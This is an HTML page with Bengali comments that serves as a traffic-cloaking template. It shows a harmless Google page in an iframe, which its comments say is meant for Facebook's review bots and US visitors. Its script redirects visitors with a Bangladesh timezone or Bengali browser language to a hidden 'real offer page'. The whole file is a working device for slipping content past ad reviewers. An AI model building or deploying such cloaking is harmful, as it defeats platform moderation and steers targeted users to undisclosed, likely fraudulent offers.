<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="referrer" content="strict-origin-when-cross-origin">
    <title>Welcome | Premium Portal</title>

    <style>
        * { box-sizing: border-box; }
        html, body { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background: #ffffff; }
        #welcome-frame { display: block; width: 100%; height: 100%; border: 0; }
    </style>
</head>
<body>

    <!-- 🎯 ১. এখানে আপনার ফেসবুক বট এবং ইউএসএ-র মানুষের জন্য সেফ গুগল সাইটের লিঙ্কটি বসানো হয়েছে -->
    <iframe
        id="welcome-frame"
        src="https://google.com"
        title="Welcome Page"
        loading="eager"
        allow="autoplay; fullscreen"
        referrerpolicy="strict-origin-when-cross-origin">
    </iframe>

    <script>
    (function () {
        // 🎯 ২. এখানে আপনার বাংলাদেশী কাস্টমারদের জন্য আসল অফার পেজের লিঙ্কটি বসানো হয়েছে
        const BANGLADESH_URL = "https://netlify.app";

        // ব্রাউজারের টাইমজোন এবং ল্যাঙ্গুয়েজ ট্র্যাকিং (যা গিটহাবে ১০০% ইনস্ট্যান্ট কাজ করবে)
        const isBdTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone === 'Asia/Dhaka';
        const isBanglaLang = navigator.language.includes('bn');

        // ভিজিটর বাংলাদেশ (BD) থেকে হলে সরাসরি আসল পেজে রিডাইরেক্ট হবে
        if (isBdTimezone || isBanglaLang) {
            window.location.replace(BANGLADESH_URL);
        }
    })();
    </script>

</body>
</html>
